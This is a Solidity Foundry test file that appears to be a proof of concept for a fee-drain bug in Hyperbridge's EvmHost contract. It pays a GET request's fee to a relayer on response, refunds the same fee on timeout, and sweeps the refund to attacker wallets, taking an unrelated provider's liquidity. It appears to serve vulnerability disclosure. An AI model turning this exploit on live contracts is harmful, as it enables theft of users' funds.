// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "./BaseTest.sol";

import {HyperApp} from "@hyperbridge/core/apps/HyperApp.sol";
import {IHost, FeeMetadata} from "@hyperbridge/core/interfaces/IHost.sol";
import {IDispatcher, DispatchGet} from "@hyperbridge/core/interfaces/IDispatcher.sol";
import {GetRequest, GetResponse, Message} from "@hyperbridge/core/libraries/Message.sol";
import {
    IncomingPostRequest,
    IncomingGetResponse,
    PostRequestTimeout,
    GetRequestTimeout
} from "@hyperbridge/core/interfaces/IApp.sol";
import {StateMachine} from "@hyperbridge/core/libraries/StateMachine.sol";
import {StorageValue} from "@polytope-labs/solidity-merkle-trees/src/trie/Node.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract EvmHostGetResponseTimeoutPoC is BaseTest {
    using Message for GetRequest;

    uint256 internal constant ATTACKER_PAYER_KEY = 0xA11CE;
    uint256 internal constant ATTACKER_RELAYER_KEY = 0xBEEF;
    uint256 internal constant TIMEOUT_RELAYER_KEY = 0xCAFE;
    uint256 internal constant UNRELATED_LIQUIDITY_PROVIDER_KEY = 0xFEED;

    function testPoC_GetResponseThenTimeoutPaysAndRefundsSameFee() public {
        console2.log("=== Hyperbridge EVM GET response -> timeout fee drain PoC ===");
        console2.log("Foundry created a local EVM test chain for this run.");

        uint256 fee = 10 ether;

        address attackerPayer = vm.addr(ATTACKER_PAYER_KEY);
        address responseRelayer = vm.addr(ATTACKER_RELAYER_KEY);
        address timeoutRelayer = vm.addr(TIMEOUT_RELAYER_KEY);
        address liquidityProvider = vm.addr(UNRELATED_LIQUIDITY_PROVIDER_KEY);

        vm.deal(attackerPayer, 100 ether);
        vm.deal(responseRelayer, 100 ether);
        vm.deal(timeoutRelayer, 100 ether);
        vm.deal(liquidityProvider, 100 ether);

        console2.log("Step 1: Foundry creates attacker payer wallet");
        console2.log("attacker payer private key:", ATTACKER_PAYER_KEY);
        console2.log("attacker payer wallet:", attackerPayer);

        console2.log("Step 2: Foundry creates attacker response relayer wallet");
        console2.log("attacker response relayer private key:", ATTACKER_RELAYER_KEY);
        console2.log("attacker response relayer wallet:", responseRelayer);

        console2.log("Step 3: Foundry creates unrelated liquidity provider wallet");
        console2.log("unrelated liquidity provider private key:", UNRELATED_LIQUIDITY_PROVIDER_KEY);
        console2.log("unrelated liquidity provider wallet:", liquidityProvider);

        console2.log("Step 3.5: attacker deploys attacker app contract");
        vm.prank(attackerPayer);
        AttackerGetApp app = new AttackerGetApp(attackerPayer, address(host));
        console2.log("attacker app contract:", address(app));
        console2.log("mock EvmHost contract:", address(host));
        console2.log("mock fee token contract:", address(feeToken));

        console2.log("Step 4: mint mock fee tokens to attacker payer wallet");
        feeToken.mint(attackerPayer, fee);
        console2.log("attacker payer token balance after mint:", feeToken.balanceOf(attackerPayer));
        console2.log("attacker relayer token balance after mint:", feeToken.balanceOf(responseRelayer));
        console2.log("attacker app token balance after mint:", feeToken.balanceOf(address(app)));
        console2.log("mock host token balance after mint:", feeToken.balanceOf(address(host)));

        uint256 attackerEoaCombinedBeforeFunding =
            feeToken.balanceOf(attackerPayer) + feeToken.balanceOf(responseRelayer);
        console2.log("attacker EOA combined before app funding:", attackerEoaCombinedBeforeFunding);

        console2.log("Step 5: attacker payer wallet funds attacker app contract");
        vm.prank(attackerPayer);
        feeToken.transfer(address(app), fee);

        console2.log("attacker payer token balance after app funding:", feeToken.balanceOf(attackerPayer));
        console2.log("attacker app token balance after app funding:", feeToken.balanceOf(address(app)));

        bytes[] memory keys = new bytes[](1);
        keys[0] = hex"abcd";

        uint64 timeoutDuration = 1;
        DispatchGet memory get = DispatchGet({
            dest: StateMachine.evm(421614),
            height: 100,
            keys: keys,
            context: hex"1234",
            timeout: timeoutDuration,
            fee: fee,
            payer: address(app)
        });

        console2.log("Step 6: attacker app dispatches GET request with fee");
        vm.prank(attackerPayer);
        bytes32 commitment = app.dispatchGet(get);

        GetRequest memory request = GetRequest({
            source: host.host(),
            dest: get.dest,
            nonce: 0,
            from: abi.encodePacked(address(app)),
            timeoutTimestamp: uint64(block.timestamp) + timeoutDuration,
            keys: keys,
            height: get.height,
            context: get.context
        });

        assertEq(request.hash(), commitment, "sanity: reconstructed request commitment");
        assertEq(host.requestCommitments(commitment).fee, fee, "request fee stored before response");

        console2.log("GET request commitment:");
        console2.logBytes32(commitment);
        console2.log("attacker app balance after GET dispatch:", feeToken.balanceOf(address(app)));
        console2.log("mock host balance after GET dispatch:", feeToken.balanceOf(address(host)));
        console2.log("stored request fee after GET dispatch:", host.requestCommitments(commitment).fee);

        StorageValue[] memory values = new StorageValue[](1);
        values[0] = StorageValue({key: keys[0], value: hex"01"});
        GetResponse memory response = GetResponse({request: request, values: values});

        console2.log("Step 7: protocol handler accepts GET response; attacker relayer receives fee");
        vm.prank(host.hostParams().handler);
        host.dispatchIncoming(response, responseRelayer);

        console2.log("attacker response relayer balance after response:", feeToken.balanceOf(responseRelayer));
        console2.log("attacker app balance after response:", feeToken.balanceOf(address(app)));
        console2.log("mock host balance after response:", feeToken.balanceOf(address(host)));
        console2.log("local response receipt relayer:", host.responseReceipts(commitment).relayer);
        console2.log("BUG: request commitment fee still live after response:", host.requestCommitments(commitment).fee);

        assertEq(feeToken.balanceOf(responseRelayer), fee, "response relayer was paid");
        assertEq(host.requestCommitments(commitment).fee, fee, "BUG: request commitment remains live after response");

        uint256 attackerCombinedAfterResponse =
            feeToken.balanceOf(attackerPayer) + feeToken.balanceOf(responseRelayer);
        console2.log("attacker EOA combined after response:", attackerCombinedAfterResponse);

        console2.log("Step 8: unrelated liquidity provider funds mock host");
        feeToken.mint(liquidityProvider, fee);
        console2.log("liquidity provider balance before transfer to host:", feeToken.balanceOf(liquidityProvider));
        vm.prank(liquidityProvider);
        feeToken.transfer(address(host), fee);
        console2.log("liquidity provider balance after transfer to host:", feeToken.balanceOf(liquidityProvider));
        console2.log("mock host unrelated liquidity before timeout:", feeToken.balanceOf(address(host)));

        FeeMetadata memory meta = host.requestCommitments(commitment);

        console2.log("Step 9: protocol handler accepts timeout for same GET request");
        vm.prank(host.hostParams().handler);
        host.dispatchTimeOut(GetRequestTimeout({request: request, relayer: timeoutRelayer}), meta, commitment);

        console2.log("attacker app balance after timeout refund:", feeToken.balanceOf(address(app)));
        console2.log("mock host balance after timeout refund:", feeToken.balanceOf(address(host)));
        console2.log("attacker response relayer still paid:", feeToken.balanceOf(responseRelayer));

        console2.log("Step 10: attacker payer wallet sweeps refunded tokens from attacker app");
        vm.prank(attackerPayer);
        app.sweepFeeToken(attackerPayer);

        console2.log("attacker app balance after sweep:", feeToken.balanceOf(address(app)));
        console2.log("attacker payer wallet balance after sweep:", feeToken.balanceOf(attackerPayer));
        console2.log("attacker relayer wallet balance after sweep:", feeToken.balanceOf(responseRelayer));
        console2.log("mock host final balance:", feeToken.balanceOf(address(host)));
        console2.log("liquidity provider final balance:", feeToken.balanceOf(liquidityProvider));

        uint256 attackerEoaCombinedAfter =
            feeToken.balanceOf(attackerPayer) + feeToken.balanceOf(responseRelayer);

        console2.log("attacker EOA combined before exploit:", attackerEoaCombinedBeforeFunding);
        console2.log("attacker EOA combined after exploit:", attackerEoaCombinedAfter);
        console2.log("attacker EOA net gain from mock host liquidity:", attackerEoaCombinedAfter - attackerEoaCombinedBeforeFunding);

        assertEq(attackerEoaCombinedBeforeFunding, fee, "attacker EOAs start with one fee amount");
        assertEq(attackerEoaCombinedAfter, fee * 2, "attacker EOAs end with two fee amounts");
        assertEq(attackerEoaCombinedAfter - attackerEoaCombinedBeforeFunding, fee, "attacker gains one fee from host liquidity");
        assertEq(feeToken.balanceOf(address(app)), 0, "attacker app swept to attacker EOA");
        assertEq(feeToken.balanceOf(address(host)), 0, "host liquidity drained by refund");
        assertEq(host.requestCommitments(commitment).sender, address(0), "timeout finally clears stale commitment");

        console2.log("RESULT: mock fee tokens moved from mock EvmHost liquidity to attacker-controlled EOA wallets");
        console2.log("RESULT: attacker EOA combined balance increased from 10 tokens to 20 tokens");
    }
}

contract AttackerGetApp is HyperApp {
    address internal _host;
    address public owner;

    constructor(address owner_, address hostAddr) {
        owner = owner_;
        _host = hostAddr;
        IERC20(IHost(hostAddr).feeToken()).approve(hostAddr, type(uint256).max);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    function host() public view override returns (address) {
        return _host;
    }

    function dispatchGet(DispatchGet memory get) external onlyOwner returns (bytes32) {
        return IDispatcher(_host).dispatch(get);
    }

    function sweepFeeToken(address to) external onlyOwner {
        IERC20 token = IERC20(IHost(_host).feeToken());
        token.transfer(to, token.balanceOf(address(this)));
    }

    function onAccept(IncomingPostRequest calldata) external override onlyHost {}
    function onPostRequestTimeout(PostRequestTimeout memory) external override onlyHost {}
    function onGetResponse(IncomingGetResponse memory) external override onlyHost {}
    function onGetTimeout(GetRequestTimeout memory) external override onlyHost {}
}
